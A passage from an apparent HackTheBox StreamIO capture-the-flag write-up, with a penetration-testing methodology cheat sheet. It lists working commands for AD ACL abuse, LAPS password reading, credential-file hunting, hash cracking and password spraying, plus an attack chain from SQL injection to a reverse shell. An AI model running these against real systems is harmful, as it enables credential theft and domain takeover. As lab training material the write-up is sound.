type C:\Users\Martin\Desktop\root.txt
```

If you ever do hit "Access Denied" on some file as admin, you still don't switch users — you use admin power to force it:

```bash
takeown /f C:\Users\Martin\Desktop\root.txt

icacls C:\Users\Martin\Desktop\root.txt /grant administrator:F
```

(or lean on `SeBackupPrivilege` to copy it out). Actually *becoming* Martin — `RunasCs`, or resetting his password — is overkill and noisier; only do it if you need to run something **as** Martin, not just read his files.

**On-box alternative (0xdf's PowerView route)** — if you only have nikk37's WinRM shell and no Linux LDAP path, do the same ACL edits with PowerView, acting **as JDgodd** via a credential object (JDgodd can't log in interactively, so you borrow nikk37's shell but authenticate the actions as JDgodd):

```powershell
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity 'Core Staff' -PrincipalIdentity 'streamio\JDgodd'

Add-DomainGroupMember -Credential $cred -Identity 'Core Staff' -Members 'StreamIO\JDgodd'

Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```

Why this is the endgame: **WriteOwner → control of the group** lets you grant yourself write access and **add yourself as a member**, and that group's **ReadLAPSPassword** right hands you the DC's local admin password. A chain of small rights = full compromise; BloodHound is what reveals it. (Note: JDgodd can't log in interactively/WinRM, but its creds are valid for **LDAP** — so bloodyAD does every step over fresh binds straight from your box; only the on-box PowerView fallback needs to borrow nikk37's shell and act as JDgodd via `-Credential $cred`.)

---

## Full chain (one glance)

```
nmap: 443 cert SAN → HTTPS vhosts (streamio.htb / watch.streamio.htb)
      │
      ▼  manual MSSQL UNION on watch /search.php (WAF gap: OR blocked, UNION allowed)
dump STREAMIO..users → crack MD5 → staff user (yoshihide)  [admin is a decoy, check is_staff]
      │
      ▼  log in → /admin/ → fuzz params (layer 2) → ?debug = LFI
php://filter read master.php → hidden eval(file_get_contents(include)) = RFI
      │
      ▼  RFI → reverse shell  (streamio\yoshihide)
read register.php → db_admin creds → sqlcmd streamio_backup..users → crack → nikk37 (WinRM)
      │
      ▼  Firefox key4.db + logins.json → firepwd → JDgodd
BloodHound: JDgodd --WriteOwner--> Core Staff --ReadLAPSPassword--> DC
      │
      ▼  PowerView: own group → add self → read LAPS password
evil-winrm as Administrator  👑
```

## Takeaways

1. **80 + 443 → read the 443 cert SAN** for the real HTTPS vhosts; a placeholder page on 80 means the app is elsewhere.
2. **IIS/vhost servers route by hostname** — use the name, not the IP.
3. **`curl -w "code=%{http_code} ip=%{remote_ip}"`** triage: `000`+no-ip = DNS/hosts, `000`+ip = conn/TLS, `200` = up. Hosts is case-insensitive; watch for stray characters.
4. **ffuf on a catch-all → `-ac` not `-fs`, and `-e <ext>`.** Fingerprint the stack to pick the extension.
5. **Fuzz in 3 layers** — paths, then parameters (`?FUZZ=`), then values. Parameter discovery finds the hidden inputs where vulns live.
6. **Fuzz authenticated areas with your session cookie** — more surface lives behind the login than in front of it. And fuzz **inside** found dirs (recursion / feroxbuster), not just the root.
7. **Fingerprint the DBMS (`@@version`) before picking SQL syntax.** MySQL vs MSSQL functions differ — wrong dialect = fake "dead end."
8. **WAFs have gaps** — one keyword blocked (`OR`) doesn't mean injection is blocked; try a different payload shape (`UNION`). On a WAF'd/rate-limited target, go **manual** — sqlmap trips the block.
9. **A username "admin" ≠ admin privilege** — check the real flag (`is_staff`). Decoys are a trap.
10. **LFI on PHP → read all source with `php://filter`** — understanding the code reveals the next bug (here, an `eval` = RFI → RCE).
11. **On a foothold, loot locally**: config/source for creds, second databases via `sqlcmd`, and **browser saved passwords** (Firefox `key4.db`+`logins.json` → firepwd).
12. **LAPS = local admin password stored in AD**; a chain of AD rights (WriteOwner → group membership → ReadLAPSPassword) in **BloodHound** = full domain compromise.

---

# 📎 Methodology (keep — reusable on every web/AD box)

## "Dead end, or do I push?" — the foothold-saver

The #1 way to miss the intended foothold: a tool says "not vulnerable" → you call it a dead end → you move on → you walk past the way in. Ask these 4 questions before ever calling something dead:

**1. Does the feature structurally involve the vuln class?** Some features inherently run the dangerous operation, so the vuln type exists by definition — a tool's "no" means your test was wrong, not that it's absent.

| Feature | Vuln class guaranteed present |
|---|---|
| login / search / any DB-backed input | SQL runs → SQLi |
| `?page=` / `?file=` / `include=` | file loaded → LFI/RFI/traversal |
| file upload | file written → upload/webshell |
| URL/callback/"fetch from URL" field | server request → SSRF |
| reflected input | rendered → XSS |
| `?cmd=` / ping / lookup tools | OS call → command injection |

The question is never "is there SQL behind this login?" (there is) — only "how do I reach it?"

**2. Is the app defending against it?** A filter/WAF/block admits the thing it blocks is a real threat here. "Bad character detected", stripped `<>'"../;`, a `blocked.php`/rate-limit → when an app guards against X, X is the path.

**3. Have I done the cheap-thorough pass yet?** A default tool run is the shallowest look. "No at default" ≠ "no." You owe any structurally-present vuln one thorough pass before calling it dead (SQLi: `--level 5 --risk 3 --dbms=<stack>`, + `--random-agent`/`--tamper` vs a WAF; LFI: wrappers/encodings/log poisoning; upload: double extensions/content-type/magic bytes). Dead-end is declared AFTER the thorough pass, never after the default.



## "Move on" ≠ "give up" — timebox + park

Over-digging one hole for hours is also a mistake. Breadth-first: touch every input/page shallowly, note the "feels off" ones. Timebox each lead (~15–20 min). Park, don't abandon — write "login: SQLi suspected, needs deep scan" and work other surface; come back with new info.

## The sqlmap escalation ladder (don't start at max)

1. Default first — `sqlmap -r req --force-ssl --batch --dbs` (all params, auto-detect DBMS). Fast; most injections show here.
2. Nothing? Escalate — `--level 5 --risk 3` (+ `--dbms=<stack>` for speed, `--tamper`/`--random-agent` if WAF). On a slow VPN add `--threads 10` and scan **one** target at a time.
3. Still nothing? Don't abandon — check other params/endpoints, try a `--tamper`, then park with a note.
   - On a WAF'd / rate-limited target, sqlmap often loses to the block — **go manual**.

## Identify the DBMS (so you can `--dbms=` / pick manual syntax)

Certain → guess: an open DB port in nmap (1433=MSSQL, 3306=MySQL, 5432=Postgres, 1521=Oracle) → a DB **error message** (`Microsoft SQL Server`, `You have an error in your SQL syntax`=MySQL, `ORA-`, `PG::`) → **stack correlation** (Windows/IIS → MSSQL, LAMP → MySQL). Best practice is the **two-step**: run 1 = detect only (`--level --risk`, no `--dbms`) → sqlmap NAMES the DBMS; run 2 = enumerate with the confirmed `--dbms`. Split "find it" from "loot it." Only guess `--dbms` upfront as a speed bet, and drop it if it comes up empty. Manual: always fingerprint with `@@version` first.

## "No obvious output — how do I know, and when do I stop?"

"No output" has flavors (blank / same page / error / redirect) — identify which. To know there IS something, use the **differential test**: change one thing, look for ANY reproducible difference — content length, a row appearing/vanishing, response time, a redirect, an error, a status code. TRUE vs FALSE (`AND 1=1` vs `AND 1=2`) or a time delay proves a blind bug with no visible data. Keep looking while there's a differential, or it's a structural vuln class / defended, and you haven't tried varied payload shapes, encodings/WAF-bypass, other params, other endpoints. Stop only when TRUE and FALSE are byte-identical with no timing difference across all of those — then park and move on. Any reproducible difference = signal = keep going.

## The 3 layers of fuzzing

Paths (`/FUZZ`) → parameters (`?FUZZ=`) → values (`?id=FUZZ`). Most people stop at paths; hidden parameters (layer 2) are where unlinked LFI/SQLi/debug endpoints hide. On any page: find it → fuzz its params → test each param. And always re-fuzz authenticated areas with your session cookie.

## Post-foothold loot checklist (Windows)

**Loot priority is driven by (a) how you got in and (b) the OS.** Web foothold → read the app's config/source for creds FIRST (connection strings live there by definition). Windows → Windows cred stores, NOT `.ssh`. A boring service account (like yoshihide) means "the value is in what the app knows, not what the user owns."

**⭐ GO-TO one-liner — run the instant you land (dumps cred lines + context, no truncation):**

```powershell
Get-ChildItem C:\inetpub,C:\xampp,C:\www,C:\Users -Recurse -Include *.config,*.php,*.xml,*.ini,*.txt,*.json,*.ps1,*.bak 2>$null | Select-String -Pattern "password|passwd|pwd|connectionString|Data Source|Server=.*;|secret|api[_-]?key|credential" -Context 1,3 2>$null | Out-String -Width 4000
```

- `-Context 1,3` = 1 line before + 3 after each hit → the **actual password/value usually sits on the line right after** a `connectionString`/`userName=` tag.
- `Out-String -Width 4000` = no `...` truncation, so you read the full line **without opening the file**.
- Match line is marked with `>`. (`IIS history` is gold: `C:\inetpub\history\CFGHISTORY_*` keeps old configs with creds later removed from the live one.)

**⚠️ Scope — the one-liner is TEXT-FILE grep ONLY.** It finds hardcoded creds in config/source files (`.php/.config/.xml…`). It does **NOT** cover:

| Source | How to get it (separate step) |
|---|---|
| Credential Manager | `cmdkey /list` (then `runas /savecred`, or LaZagne) |
| Browser saved passwords (binary, not text) | Firefox `key4.db`+`logins.json` → `firepwd`; Chrome `Login Data`+DPAPI; or **LaZagne** |
| PowerShell history | `Get-Content (Get-PSReadlineOption).HistorySavePath` |
| SAM / LSASS / registry | `secretsdump`, mimikatz, `reg save` |

**All-in-one easy buttons:** `lazagne.exe all` (dumps stored passwords from files + Credential Manager + browsers + wifi), and **WinPEAS** (`winPEASany.exe`, full privesc enum incl. creds + SeImpersonate). The one-liner is the fast first pass; cmdkey/browsers/LSASS are *additional* checks.
**Then, in order (cheapest/highest-yield first):**

1. `whoami /all` + `whoami /priv` — **SeImpersonate/SeDebug** → potato/injection (sometimes the fastest win).
2. The cred one-liner above (webroot/config creds).
3. Saved Windows creds: `cmdkey /list` · PowerShell history: `Get-Content (Get-PSReadlineOption).HistorySavePath` · `unattend.xml`/`sysprep.xml`/`web.config`.
4. **Browser saved passwords** (Firefox `key4.db`+`logins.json` → `firepwd`; Chrome Login Data + DPAPI).
5. Other users' Desktops/home dirs, scheduled tasks, services, backups.
6. SSH keys (quick check — low prob on Windows).
7. Fallback: **databases** via `sqlcmd` (second DBs the web layer didn't expose).
8. Then **BloodHound** for the AD path to Administrator (WriteOwner/GenericAll chains, ReadLAPSPassword, Kerberoast, etc.).

## Cracking & validating dumped creds — store → crack → validate

When you dump a `users` table (or any `user:hash` set), don't eyeball it — run the pipeline. Don't assume which user matters; **crack them all, then spray to see which are valid and where.**

**1. Store** as `user:hash`, one per line → `dump.hashes`:

```
nikk37:389d14cb8e4e9b94b137deb1caf0612a
...
```

**2. Crack** (MD5 = `-m 0`; `--username` keeps the user↔hash mapping):

```bash
hashcat -m 0 dump.hashes /usr/share/wordlists/rockyou.txt --username
hashcat -m 0 dump.hashes /usr/share/wordlists/rockyou.txt --username --show      # user:hash:password
```
(figure out the mode from the hash: MD5=0, SHA1=100, NTLM=1000, bcrypt=3200; or `hashid`/`hash-identifier`.)

**3. Build a `user:pass` list** from what cracked:

```bash
hashcat -m 0 dump.hashes rockyou.txt --username --show | awk -F: '{print $1":"$3}' > creds.txt
```

**4. Validate** — spray across services (nxc marks `[+]` valid, `(Pwn3d!)` for admin/WinRM):

```bash
cut -d: -f1 creds.txt | sort -u > users.txt
cut -d: -f2 creds.txt | sort -u > pass.txt
nxc smb   <ip> -u users.txt -p pass.txt --continue-on-success
nxc winrm <ip> -u users.txt -p pass.txt --continue-on-success
# exact pairs (no cross-product): hydra -C creds.txt <ip> smb
```
`--continue-on-success` tests everything. **The spray tells you which cred works and where — you don't guess.** A WinRM `(Pwn3d!)` → `evil-winrm` as that user.

### Hashcat gotchas (these bit me on the backup-DB dump)

- **`Token length exception` / `No hashes loaded`** = the hash file is **dirty** — DB CLIs like `sqlcmd` pad columns with **trailing spaces**, so `hash␣␣␣` isn't a valid 32-char MD5. **Clean it before cracking.**
- **Cleanest clean-up — extract the exact pattern with grep** (ignores usernames, line numbers, padding):
  ```bash
  grep -oE '[a-f0-9]{32}' dump > hashes.txt                 # just the hashes
  grep -oE '[A-Za-z0-9._]+:[a-f0-9]{32}' dump > userhash.txt # user:hash pairs (for --username)
  ```
  
- If the dump has a **space after the colon** (`William: d62be…`), fix it first: `sed 's/: */:/' dump > clean`.
- **Crack FIRST, `--show` SECOND.** `--show` only reprints hashes **already cracked** in the potfile — it never cracks. Running `--show` before a successful crack prints nothing (or errors, which then land in your `creds.txt` if you pipe it). Order: `hashcat -m 0 file wordlist` → *then* `hashcat -m 0 file wordlist --show`.
- **Note:** cracking the backup DB, only the NEW user (nikk37) matters — the rest were duplicate hashes already cracked from `STREAMIO`. Crack them all anyway and let the spray decide; don't pre-pick.
